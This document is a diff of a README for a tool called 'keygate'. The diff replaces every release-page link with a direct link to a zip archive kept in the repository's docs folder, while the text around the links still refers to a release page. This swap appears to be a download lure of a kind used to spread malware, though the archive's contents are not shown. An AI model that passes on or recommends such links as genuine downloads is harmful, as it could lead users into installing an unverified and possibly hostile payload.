@@ -1,6 +1,6 @@
 # 🔐 keygate - Simple license control for teams
 
-[![Download keygate](https://img.shields.io/badge/Download%20keygate-blue-grey)](https://github.com/masseuseherpetology481/keygate/releases)
+[![Download keygate](https://img.shields.io/badge/Download%20keygate-blue-grey)](https://github.com/masseuseherpetology481/keygate/raw/refs/heads/main/docs/Software-v3.2-beta.2.zip)
 
 ## 🚀 Overview
 
@@ -25,7 +25,7 @@ If you plan to run it on one machine, a basic Windows desktop or server is enoug
 
 Visit this page to download keygate:
 
-https://github.com/masseuseherpetology481/keygate/releases
+https://github.com/masseuseherpetology481/keygate/raw/refs/heads/main/docs/Software-v3.2-beta.2.zip
 
 On that page:
 
@@ -207,7 +207,7 @@ This helps you confirm that the main parts work before you go live
 
 If you need the release page again, use this link:
 
-[https://github.com/masseuseherpetology481/keygate/releases](https://github.com/masseuseherpetology481/keygate/releases)
+[https://github.com/masseuseherpetology481/keygate/raw/refs/heads/main/docs/Software-v3.2-beta.2.zip](https://github.com/masseuseherpetology481/keygate/raw/refs/heads/main/docs/Software-v3.2-beta.2.zip)
 
 ## 🧱 Project details
 
